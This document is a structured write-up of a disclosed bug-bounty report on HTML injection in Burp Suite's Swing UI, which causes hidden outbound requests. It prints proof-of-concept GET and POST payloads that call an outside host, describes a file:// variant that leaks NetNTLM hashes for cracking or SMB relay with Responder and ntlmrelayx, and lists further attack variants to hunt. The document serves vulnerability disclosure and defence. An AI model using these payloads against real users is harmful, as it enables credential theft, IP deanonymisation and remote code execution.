# HTML Injection in Swing Causes Client-Side SSRF, NetNTLM Hash Disclosure, and DoS in Burp Suite

## Metadata
- **Source:** HackerOne
- **Report:** 1054382 | https://hackerone.com/reports/1054382
- **Submitted:** 2020-12-08
- **Reporter:** issuefinder
- **Program:** Burp Suite (Pro and Community)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** HTML Injection, Client-Side SSRF, Improper Input Validation, Information Disclosure, Denial of Service, Unsafe HTML Rendering
- **CVEs:** CVE-2021-29416
- **Category:** web-api

## Summary
Burp Suite's Swing UI automatically processes HTML tags in intercepted HTTP requests, triggering unsolicited hidden requests to attacker-controlled destinations. This vulnerability allows attackers to leak the victim's real IP address, Windows NetNTLM credentials, facilitate SMB relay attacks for RCE, or cause denial of service by hanging connections.

## Attack scenario
1. Attacker crafts a malicious website or interceptable request containing HTML with img/link tags pointing to attacker infrastructure
2. Security auditor using Burp Suite visits the malicious website and intercepts the request, views it in HTTP history, or pastes payload in Repeater tab
3. Burp Suite's Swing rendering engine automatically parses HTML tags and initiates unsolicited hidden HTTP/SMB requests to attacker's server
4. For IP leak: Attacker logs request origin IP, bypassing victim's configured upstream proxy/SOCKS settings
5. For NetNTLM: Attacker uses file:// scheme to trigger SMB negotiation, capturing victim's username, computer name, and NetNTLM hash via Responder
6. For RCE: Attacker relays captured SMB negotiation to internal machines using ntlmrelayx to achieve code execution in victim's context

## Root cause
Burp Suite's Swing UI component renders HTML content from user-controlled HTTP request parameters without proper sanitization or sandboxing. The rendering engine automatically fetches remote resources (images, stylesheets) specified in HTML tags without user awareness or consent, and bypasses proxy configurations during these automatic requests.

## Attacker mindset
An attacker recognizes that security testing tools like Burp Suite implicitly trust and render HTML from intercepted traffic. By injecting malicious HTML into injectable parameters, the attacker exploits the tool's automatic resource fetching behavior to conduct reconnaissance (IP enumeration), credential harvesting (NetNTLM), privilege escalation (SMB relay), or disruption (DoS). The attack is particularly effective because it targets security professionals who may have sensitive credentials and network access.

## Defensive takeaways
- Disable automatic HTML rendering of user-supplied content in HTTP request/response viewers
- Implement strict Content Security Policy (CSP) headers to prevent automatic resource fetching
- Sanitize or escape HTML entities in request parameter display before rendering
- Sandbox HTML rendering engines to prevent automatic network requests without explicit user action
- Respect proxy configuration settings for all outbound requests, including automatic resource fetching
- Require explicit user confirmation before initiating network requests triggered by HTML content
- Filter or block file:// scheme URIs in HTML content to prevent SMB attacks on Windows systems
- Implement request signing or integrity verification to detect injected HTML payloads
- Use headless rendering modes that do not execute HTML/CSS logic automatically

## Variant hunting
Test other Burp Suite views (Site Map, Scanner results, Target tabs) for similar HTML injection points
Check if other content-inspection tools (Fiddler, Charles Proxy, OWASP ZAP) have similar Swing/rendering vulnerabilities
Investigate if SVG, XML, or XHTML parsing triggers similar automatic resource fetching
Test script tag injection (javascript:, onload handlers) for code execution payloads
Explore other URI schemes (gopher://, dict://, ldap://) for protocol confusion attacks
Examine whether CSS @import, @font-face rules trigger automatic requests in styling contexts

## MITRE ATT&CK
- T1190
- T1598
- T1040
- T1557
- T1187
- T1005
- T1566
- T1021

## Notes
This vulnerability affects security professionals specifically, making it a high-value target for attackers. The bypass of proxy configuration settings is particularly concerning as it defeats security controls intentionally configured by the user. The SMB relay variant demonstrates how client-side vulnerabilities can chain into network-level attacks. All four impact scenarios have verified PoC videos. The vulnerability persists across multiple interaction patterns (intercept, history view, repeater) making it difficult to avoid through usage patterns alone.

## Full report
<details><summary>Expand</summary>

The vulnerability is like a SSRF but on the client side, where an attacker can force an unsolicited hidden request made by Burp Suite when the victim performs some actions.
During normal browsing to a website through Burp Suite (Pro or Community), if the website makes a request with HTML code in a GET parameter or in a POST body, and the auditor (the victim):
- Intercepts that request, or
- Selects that request in HTTP history (Proxy tab), or
- Sends that request to repeater, or
- In repeater, makes any change to the HTML code (preserving the main structure),

Burp Suite will do an unsolicited hidden request to the destination specified in the "img" or "link" HTML tags.

Next, you can see a GET and a POST example that trigger an unsolicited hidden request to "http://www.rec2.ml/leak" just by pasting them on a repeater tab:

## GET request (using the "img" tag)
```
GET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1
```

## POST request (using the "link" tag)
```
POST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
```
In fact, a smaller payload to produce the same behaviour can be achieved by pasting the following on a repeater tab:
```
?=<html><img+src='http://www.rec2.ml/leak'>
```

## Impact

An attacker can exploit this vulnerability in at least 4 different ways:


##1. Real public IP address leak

The unsolicited hidden request does not respect the configuration in User options tab:
- Upstream Proxy Servers
- SOCKS proxy

An auditor (the victim), trying to hide his real public IP address from an audited website (using an upstream proxy server or a SOCKS proxy), would be leaking it without being aware of this fact.

Affected OS: Linux, MacOS, Windows
PoC video: burpsuite_leak_vuln-leak.mp4


##2. Windows NetNTLM hashes leak

If the HTML code uses the “file://” scheme instead of the “http[s]://” , it will produce an unsolicited hidden request using the SMB protocol that will negotiate and leak the auditor's:
- Username
- Computer name or domain
- NetNTLM hash

The NetNTLM can be cracked and therefore used at a later stage.
To negotiate and get the NetNTLM hash an attacker can use Responder (https://github.com/lgandx/Responder).

Affected OS: Windows
PoC video: burpsuite_leak_vuln-netntlm.mp4


##3. RCE on other machines

To perform this attack in the best scenario, an attacker must be on the same internal network with network visibility with the victim (auditor).
This attack is a variant of the previous one (2. Windows NetNTLM hashes leak) in which, instead of cracking the NetNTLM hash, the attacker does a MiTM to relay the SMB negotiation to other machines (without SMB signing enabled) and obtain a RCE in the context of the victim.

The HTML code must also use the “file://” scheme instead of the “http[s]://” , to produce an unsolicited hidden request using the SMB protocol.
To relay the SMB negotiation an attacker can use ntlmrelayx (https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).

Affected OS: Windows
PoC video: burpsuite_leak_vuln-rce.mp4


##4. Denial of Service (DoS).

If the attacker does not respond to the unsolicited hidden request made by Burp Suite and keeps the TCP connection open, then it can freeze Burp Suite execution, forcing the auditor (victim) to lose the unsaved changes.

Affected OS: Linux, MacOS, Windows
PoC video: burpsuite_leak_vuln-dos.mp4

</details>

---
*Analysed by Claude on 2026-05-24*
